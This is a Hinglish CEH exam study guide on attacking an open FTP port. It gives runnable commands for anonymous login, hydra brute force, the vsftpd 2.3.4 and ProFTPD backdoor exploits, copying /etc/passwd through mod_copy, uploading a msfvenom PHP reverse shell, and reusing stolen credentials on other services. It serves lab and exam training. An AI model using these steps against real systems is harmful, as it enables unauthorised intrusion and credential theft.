# FTP PORT OPEN MILA (21) — Ab Kya Karu?

---

## Pehle Samjho: FTP Kya Hai?

FTP (File Transfer Protocol) ek purana protocol hai jo **files transfer** karne ke liye use hota hai — client aur server ke beech. Jab tum nmap karte ho aur port **21** open dikhta hai, toh samjho ki saamne ek machine hai jisme:

- Files stored hain jo download ho sakti hain
- **Anonymous login** allowed ho sakta hai (bina password ke ghus sakte ho!)
- Purane FTP server versions mein **backdoor** hote hain (jaise vsftpd 2.3.4)
- Agar write access mila toh **webshell upload** bhi kar sakte ho
- Credentials mil sakti hain jo doosri services (SSH, Web, RDP) pe reuse hoti hain

FTP ke do modes hote hain: **Active** aur **Passive**. CEH exam mein mainly tumhe FTP pe login karna hai, files dhundni hain, ya exploit karna hai — modes ka zyada tension mat lo.

**Important:** FTP traffic **plaintext** hota hai — username/password sab clear text mein jaata hai. Isliye Wireshark mein FTP packets se creds easily nikal sakte ho.

---

## Step 1: Nmap Se FTP Version Aur Details Confirm Karo

Pehle basic scan:
```bash
nmap -sV -sC -p 21 <TARGET_IP>
```

Output mein ye dekho:
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x  2 0  0  4096 Apr 01 flags
```

**Kya dhyan se dekhna hai:**
- **Version** (vsftpd 2.3.4, ProFTPD 1.3.3c, etc.) — exploits ke liye
- **`ftp-anon: Anonymous FTP login allowed`** — iska matlab bina password ke ghus sakte ho!
- **File listing** — kabhi kabhi nmap khud files dikha deta hai

Specific anonymous check ke liye:
```bash
nmap --script ftp-anon -p 21 <TARGET_IP>
```

---

## Step 2: Anonymous Login Try Karo (PEHLE YEH KARO)

Ye sabse pehla step hai — FREE access milega toh brute force ki zaroorat hi nahi:

```bash
ftp <TARGET_IP>
```

Jab username maange:
```
Name: anonymous
Password: (kuch bhi daalo — blank, anonymous@, ya koi bhi email)
```

**Kya hoga:**
- `230 Login successful` → Andar aa gaye! Step 3 pe jao
- `530 Login incorrect` ya `530 Permission denied` → Anonymous nahi chala, Step 4 pe jao

**Ya ek liner se:**
```bash
ftp -n <TARGET_IP> <<EOF
user anonymous anonymous@
ls
bye
EOF
```

---

## Step 3: Files Browse Aur Download Karo (Anonymous Ya Creds Se Login Hua)

Login hone ke baad ye commands use karo:

```bash
ftp> ls -la                    # HIDDEN files bhi dikhega (-la important hai!)
ftp> pwd                       # current directory kya hai
ftp> cd /home                  # home directory mein jao
ftp> ls -la
ftp> cd /var/www               # agar web server bhi hai toh yahan dekho
ftp> cd /etc                   # config files
```

**Files download karna:**
```bash
ftp> get flag.txt              # single file download
ftp> get secret.txt
ftp> get credentials.txt
ftp> mget *.txt                # saare .txt files ek saath download
ftp> binary                    # IMPORTANT: binary mode for non-text files
ftp> get backup.zip            # ab zip file sahi se download hogi
ftp> get id_rsa                # SSH private key!!
```

**Kya dhundna hai files mein:**
- `flag.txt`, `proof.txt` → Direct answer/flag
- `credentials.txt`, `passwords.txt`, `creds.txt` → Login details for other services
- `.htpasswd`, `wp-config.php`, `config.php` → Web app credentials
- `.ssh/` folder ya `id_rsa` → SSH private key (bahut valuable!)
- `.bash_history` → Previous commands with possible passwords
- `backup.zip`, `backup.tar.gz` → Backup files mein sensitive data hota hai

**Pro Tip:** Hidden files dekhna mat bhoolo! `ls -la` use karo, sirf `ls` se hidden files nahi dikhte.

---

## Step 4: Brute Force FTP Login (Agar Anonymous Nahi Chala)

Agar anonymous denied ho gaya, toh password crack karo:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> ftp -t 4
```

**Command samjho:**
- `-l admin` → username "admin" fix kiya (lowercase L)
- `-P rockyou.txt` → password list (uppercase P = file, lowercase p = single password)
- `-t 4` → 4 threads (FTP zyada handle nahi karta, 4 safe hai)

**Agar multiple users try karne hain:**
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt <TARGET_IP> ftp -t 4
```

**Users kahan se laoge?**
- `enum4linux -U <IP>` se (agar SMB bhi open hai)
- `smtp-user-enum` se (agar SMTP open hai)
- Common try karo: `admin`, `root`, `ftp`, `user`, `test`, `www-data`
- Kisi aur service se already mil gaye ho

**Medusa se bhi try kar sakte ho (alternative):**
```bash
medusa -h <TARGET_IP> -u admin -P /usr/share/wordlists/rockyou.txt -M ftp
```

Creds milne ke baad → Step 3 pe wapas jao aur login karke files dhundo.

---

## Step 5: FTP Version Check — Known Exploits

Ye bahut important step hai! Kuch FTP server versions mein **known backdoors** hain:

```bash
nmap -sV -p 21 <TARGET_IP>
```

### CASE A: vsftpd 2.3.4 — BACKDOOR (Sabse Famous!)

Ye version mein ek **malicious backdoor** hai. Koi bhi username ke baad `:)` (smiley face) lagao toh port 6200 pe shell open ho jaata hai!

**Metasploit se (easiest):**
```bash
msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <TARGET_IP>
run
```

**Kya hoga:** Agar vulnerable hai toh seedha **root shell** milega. Koi password ki zaroorat nahi!

**Manual method (agar Metasploit nahi chahiye):**
```bash
telnet <TARGET_IP> 21
USER test:)
PASS anything
# Ab doosri terminal mein:
nc <TARGET_IP> 6200
# Shell mil jayega!
```

### CASE B: ProFTPD 1.3.3c — BACKDOOR

```bash
msfconsole -q
use exploit/unix/ftp/proftpd_133c_backdoor
set RHOSTS <TARGET_IP>
run
```

### CASE C: ProFTPD 1.3.5 — mod_copy (File Copy Without Auth)

Ye backdoor nahi hai but ek **misconfiguration** hai — bina login ke files copy kar sakte ho server pe:

```bash
nc <TARGET_IP> 21
SITE CPFR /etc/passwd          # source file
SITE CPTO /var/www/html/passwd.txt   # destination (web accessible)
# Ab browser mein: http://<TARGET_IP>/passwd.txt
```

**Iska use:** Sensitive files ko web directory mein copy karo, phir browser se padho.

### Quick Version Table:

| FTP Version | Vulnerability | Exploit Method |
|---|---|---|
| **vsftpd 2.3.4** | Backdoor (smiley trigger) | `exploit/unix/ftp/vsftpd_234_backdoor` |
| **ProFTPD 1.3.3c** | Backdoor | `exploit/unix/ftp/proftpd_133c_backdoor` |
| **ProFTPD 1.3.5** | mod_copy file copy | SITE CPFR/CPTO commands |
| **Any version** | Brute force | hydra/medusa |

**General exploit search:**
```bash
searchsploit vsftpd
searchsploit proftpd
searchsploit "ftp" | grep <version>
```

---

## Step 6: Upload Shell via FTP (Agar Write Access Hai)

Agar tumhe FTP pe **write permission** mila hai AUR target pe web server bhi chal raha hai (port 80/443), toh webshell upload kar sakte ho:

**Check karo write access hai:**
```bash
ftp> put test.txt              # agar "Transfer complete" aaye toh write hai
```

**Webshell upload karo:**
```bash
# Pehle shell banao (apni Parrot machine pe):
msfvenom -p php/reverse_php LHOST=<YOUR_IP> LPORT=4444 -o shell.php

# FTP se upload:
ftp> cd /var/www/html          # web root directory
ftp> put shell.php

# Listener start karo:
nc -nlvp 4444

# Browser mein trigger karo:
# http://<TARGET_IP>/shell.php
```

**Important:** Write access hona zaroori hai AUR upload location web-accessible honi chahiye. Agar `/var/www/html` mein upload kiya toh browser se access hoga, random folder mein kiya toh nahi.

---

## Step 7: FTP Bounce Scan (Rare But Know It)

FTP Bounce attack mein tum FTP server ko **proxy** ki tarah use karte ho doosri machines scan karne ke liye:

```bash
nmap -b anonymous@<FTP_IP> <TARGET_INTERNAL_IP>
```

**Kab use hoga:** Agar question mein specifically "FTP bounce" likha ho ya internal network scan karna ho FTP server ke through. CEH exam mein rare hai but theory question aa sakta hai.

---

## Step 8: Credential Reuse — FTP Se Mile, Baaki Pe Try Karo

Ye BAHUT important hai! Agar FTP se username/password mile toh **har jagah try karo**:

```bash
# SSH pe:
ssh found_user@<TARGET_IP>

# RDP pe:
xfreerdp /v:<TARGET_IP> /u:found_user /p:found_password

# MySQL pe:
mysql -h <TARGET_IP> -u found_user -p'found_password'

# SMB pe:
smbclient //<TARGET_IP>/C$ -U 'found_user%found_password'

# Web login pe bhi try karo!
```

---

## Common Mistakes (Mat Karna Ye):

1. **`binary` mode bhool gaye** — zip/exe files corrupt ho jayengi agar binary mode on nahi kiya download se pehle
2. **`ls -la` ki jagah sirf `ls`** — hidden files miss ho jayengi (`.ssh`, `.htpasswd`, `.bash_history`)
3. **Anonymous login try nahi kiya** — sabse pehle ye karo, free access ho sakta hai!
4. **vsftpd 2.3.4 version dekha aur brute force karne lage** — pehle backdoor exploit try karo, instant root milega
5. **Hydra mein `-t` bhool gaye** — FTP server zyada connections handle nahi karta, `-t 4` rakho
6. **Write access check nahi kiya** — agar write hai toh shell upload bahut powerful move hai
7. **FTP se mili creds doosri services pe try nahi ki** — credential reuse exam mein bahut common hai
8. **`mget *` mein prompt bhool gaye** — `prompt off` karo pehle, nahi toh har file ke liye yes/no puchega

---

## Quick Decision Tree:

```
FTP open (port 21)
  |
  ├─ nmap -sV -sC -p 21 <IP> (VERSION aur ANONYMOUS check)
  |   |
  |   ├─ vsftpd 2.3.4? ─────────→ Metasploit backdoor → ROOT SHELL
  |   ├─ ProFTPD 1.3.3c? ───────→ Metasploit backdoor → ROOT SHELL  
  |   ├─ ProFTPD 1.3.5? ────────→ mod_copy CPFR/CPTO → file copy
  |   └─ Other version? ────────→ searchsploit check → brute force
  |
  ├─ Anonymous login try karo (PEHLE YEH)
  |   ├─ LOGIN HUA → ls -la → get files → find flag/creds
  |   |   ├─ Flag mili? → SUBMIT
  |   |   ├─ Creds mile? → SSH/RDP/MySQL/Web pe reuse
  |   |   ├─ id_rsa mili? → chmod 600 → ssh -i key user@IP
  |   |   └─ Write access? → Upload webshell → trigger from browser
  |   |
  |   └─ LOGIN NAHI HUA → Step 4 (Brute Force)
  |
  ├─ Brute Force: hydra -l admin -P rockyou.txt <IP> ftp -t 4
  |   ├─ Creds mile → Login → files dhundo
  |   └─ Nahi mile → doosri services pe focus karo
  |
  └─ Doosri service se creds mile?
      └─ FTP pe try karo: ftp → login → browse
```
